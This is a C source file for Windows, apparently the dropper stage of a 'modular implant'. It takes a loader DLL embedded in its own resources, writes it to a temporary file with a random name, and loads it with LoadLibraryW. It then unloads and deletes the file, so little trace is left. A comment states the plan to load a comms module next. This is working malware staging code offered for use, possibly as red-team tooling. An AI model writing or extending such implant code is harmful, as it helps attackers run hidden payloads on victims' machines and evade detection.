#include <Windows.h>

#include <stdio.h>

#include "ModularImplant.h"

INT
wmain(INT argc, PWSTR argv[])
{
	/*
	* Implant should:
	*	1. Load embedded modules from resources
	*	2. Load comms module using loader
	*/
	LOADED_MODULE lmLoader = { 0 };
	
	LoadEmbeddedLoader(&lmLoader);

	if (lmLoader.hModule &&
			FALSE == FreeLibrary(lmLoader.hModule))
	{
		LOG_ERROR("FreeLibrary failed");
	}

	if (lmLoader.pwszModuleFileName &&
			FALSE == DeleteFileW(lmLoader.pwszModuleFileName))
	{
		LOG_ERROR("DeleteFile failed");
	}

	HeapFree(GetProcessHeap(), 0, lmLoader.pwszModuleFileName);

	ZeroMemory(&lmLoader, sizeof(lmLoader));

	return EXIT_SUCCESS;
}

BOOL
GetRandomPrefixW(
	PWSTR wszPrefixBuf,
	DWORD cbBufSize)
{
	NTSTATUS ntResult = STATUS_INVALID_HANDLE;

	if (cbBufSize < sizeof(WCHAR) * PREFIX_LEN)
	{
		LOG_ERROR("Prefix buffer too small");
		return FALSE;
	}

	ntResult = BCryptGenRandom(
		NULL,
		(PUCHAR)wszPrefixBuf,
		cbBufSize,
		BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!BCRYPT_SUCCESS(ntResult))
	{
		LOG_ERROR("BCryptGenRandom failed");
		return FALSE;
	}

	wszPrefixBuf[0] = CLAMP_WCHAR_TO_UPPER(wszPrefixBuf[0]);
	wszPrefixBuf[1] = CLAMP_WCHAR_TO_UPPER(wszPrefixBuf[1]);
	wszPrefixBuf[2] = CLAMP_WCHAR_TO_UPPER(wszPrefixBuf[2]);
	
	wszPrefixBuf[PREFIX_LEN - 1] = L'\0';

	return TRUE;
}

BOOL
GetRandomTempFileNameW(
	PWSTR wszTempFileNameBuf,
	SIZE_T ccFileNameBufSize)
{
	WCHAR awcTempFileName[MAX_PATH] = { 0 },
		awcFilePrefix[PREFIX_LEN] = { 0 };
	HRESULT hResult = S_FALSE;

	if (FALSE == GetRandomPrefixW(awcFilePrefix, sizeof(awcFilePrefix)))
	{
		return FALSE;
	}

	if (FALSE == GetTempFileNameW(L".", awcFilePrefix, 0, awcTempFileName))
	{
		LOG_ERROR("GetTempFileName failed");
		return FALSE;
	}

	hResult = StringCchCopyW(wszTempFileNameBuf, ccFileNameBufSize, awcTempFileName);
	if (FAILED(hResult))
	{
		LOG_ERROR("StringCchCopy failed");
		return FALSE;
	}

	wszTempFileNameBuf[ccFileNameBufSize - 1] = L'\0';
	
	return TRUE;
}

BOOL
LoadEmbeddedLoader(
	PLOADED_MODULE pLoadedModule)
{
	HRSRC hrsrcLoader = NULL;
	HGLOBAL hgLoader = NULL;
	PVOID lpLoaderData = NULL;
	DWORD dwLoaderSize = 0, dwTempFileNameLen = MAX_PATH;
	PWSTR pwszTempFileName = NULL;
	HMODULE hmLoader = NULL;

	if (!pLoadedModule)
	{
		LOG_ERROR("Invalid parameter");
		return FALSE;
	}

	pwszTempFileName = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTempFileNameLen);
	if (NULL == pwszTempFileName)
	{
		LOG_ERROR("HeapAlloc failed");
		return FALSE;
	}

	if (FALSE == GetRandomTempFileNameW(pwszTempFileName, dwTempFileNameLen))
	{
		LOG_ERROR("GetTempFileName failed");
		return FALSE;
	}

	hrsrcLoader = FindResourceW(NULL, MAKEINTRESOURCEW(Loader), RT_RCDATA);
	if (NULL == hrsrcLoader)
	{
		LOG_ERROR("FindResource failed");
		return FALSE;
	}

	hgLoader = LoadResource(NULL, hrsrcLoader);
	if (NULL == hgLoader)
	{
		LOG_ERROR("LoadResource failed")
		return FALSE;
	}

	dwLoaderSize = SizeofResource(NULL, hrsrcLoader);
	if (0 == dwLoaderSize)
	{
		LOG_ERROR("SizeofResource failed");
		return FALSE;
	}

	lpLoaderData = LockResource(hgLoader);
	if (NULL == lpLoaderData)
	{
		LOG_ERROR("LockResource failed");
		return FALSE;
	}

	if (FALSE == WriteDataToFile(pwszTempFileName, lpLoaderData, dwLoaderSize))
	{
		return FALSE;
	}

	UnlockResource(hgLoader);

	hmLoader = LoadLibraryW(pwszTempFileName);
	if (NULL == hmLoader)
	{
		LOG_ERROR("LoadLibrary failed");
	}
	else
	{
		LOG_MSG("LoadLibrary success");
	}

	pLoadedModule->hModule = hmLoader;
	pLoadedModule->pwszModuleFileName = pwszTempFileName;

	return TRUE;
}

BOOL
WriteDataToFile(
	LPCWSTR wszFileName,
	PVOID pData,
	DWORD dwDataLen)
{
	BOOL fReturn = FALSE;
	HANDLE hTempFile = INVALID_HANDLE_VALUE;
	DWORD cbBytesWritten = 0;

	hTempFile = CreateFileW(wszFileName,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		0,
		NULL);
	if (INVALID_HANDLE_VALUE == hTempFile)
	{
		LOG_ERROR("CreateFile failed");
		return FALSE;
	}

	if (FALSE == WriteFile(hTempFile,
		pData,
		dwDataLen,
		&cbBytesWritten,
		NULL))
	{
		LOG_ERROR("WriteFile failed");
		CloseHandle(hTempFile);
		return FALSE;
	}

	CloseHandle(hTempFile);

	return TRUE;
}